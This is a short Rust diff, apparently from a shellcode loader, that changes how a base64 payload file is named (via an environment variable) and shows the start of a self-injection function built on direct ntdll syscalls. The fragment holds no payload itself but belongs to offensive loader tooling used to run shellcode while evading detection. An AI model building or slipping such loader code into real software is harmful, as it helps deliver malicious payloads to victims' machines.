@@ -41,10 +41,10 @@ pub fn do_load()
 #[allow(dead_code)]
 #[cfg(all(feature = "payload_b64"))]
 fn get_shell_code() -> Vec<u8> {
-    let base64_shell_code = include_str!("payload.b64");
+    let base64_shell_code = include_str!(env!("PAYLOAD_FILE_NAME"));
     crate::helpers::base64_to_vec(base64_shell_code)
 }
-
+ 
 #[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
 fn load(shell_code: Vec<u8>) -> bool {
     let ntdll = SyscallWrapper::new();
